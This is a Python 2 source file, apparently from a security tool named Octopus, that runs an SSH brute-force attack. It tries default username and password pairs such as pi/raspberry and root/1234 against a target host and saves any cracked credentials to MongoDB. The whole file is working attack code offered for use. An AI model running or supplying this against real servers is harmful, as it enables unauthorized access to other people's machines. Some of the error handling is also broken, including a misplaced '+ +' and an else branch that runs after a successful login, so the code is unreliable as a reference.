# -*- coding: utf-8 -*

#############################################################################
#	Copyright (C) 2018  Javier Mínguez @JaviMrSec							#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################

import paramiko, sys, os, socket
from pymongo import MongoClient

client = MongoClient()
db = client.Octopus

def update_mongodb(host, user, pwd):
    try:
        db.hosts.update({"host":host},{"$set":{"credentials.ssh_user":user}})
        db.hosts.update({"host":host},{"$set":{"credentials.ssh_pass":pwd}})
        print colors.SUCCES + "[INFO] DATA UPDATED IN MONGODB" + colors.REGULAR
    except:
        print colors.FAIL + "[WARNING] ERROR INSERTING IN MONGODB" + colors.REGULAR

class colors:
    HEADER = '\033[93m'
    FAIL = '\033[91m'
    SUCCES = '\033[92m'
    REGULAR = '\033[0m'

def sshBrute(address):
    users = ['pi', 'server', 'pi2', 'root', 'admin', 'user', 'test']
    passwords = ['root', '1234', '123456', 'admin', 'raspberry', 'test']
    port = 22
    print colors.HEADER + "[TARGET] SSH connect to " + address + colors.REGULAR
    paramiko.util.log_to_file("ssh_brute.log")
    succ_user = ''
    succ_pass = ''

    for u in users:
        if(succ_user != '' and succ_pass != ''):
            break
        for p in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                print colors.HEADER + "|----[INFO] Try user: "+u+", password: " + p + colors.REGULAR
                ssh.connect(address, port, username=u, password=p, timeout=10)
                if(ssh.get_transport().is_active()):
                    succ_user = u
                    succ_pass = p
                    break
            except paramiko.AuthenticationException, error:
                print colors.FAIL + "|----[ERROR] incorrect password... " + u + "/" + p + colors.REGULAR
                continue
            except socket.error, error:
                print error
                print colors.FAIL +"|----[ERROR] with "+ u + "/"+ p + ": " + colors.REGULAR
                continue
            except paramiko.SSHException, error:
                print error
                print colors.FAIL + "|----[ERROR]Most probably this is caused by a missing host key" + colors.REGULAR
                continue
            except Exception, error:
                print colors.FAIL + "|----[ERROR]Unknown error: " + str(error) + + colors.REGULAR
                continue
            except:
                ssh.close()
            else:
                print colors.FAIL + "|----[INFO] " + address + " is protected..." + colors.REGULAR

        ssh.close()
    if(succ_user != '' and succ_pass != ''):
        print colors.SUCCES +"|----[SUCCESS] "+ succ_user+"/"+succ_pass + colors.REGULAR
        update_mongodb(address, succ_user, succ_pass)
        res=[address, succ_user, succ_pass]
        return res
    else:
        print colors.FAIL + "|----[ERROR] Clave no encontrada"  + colors.REGULAR
        succ_user = 'blocked'
        succ_pass = 'blocked'
        update_mongodb(address, succ_user, succ_pass)
        res=[address, succ_user, succ_pass]
        return res
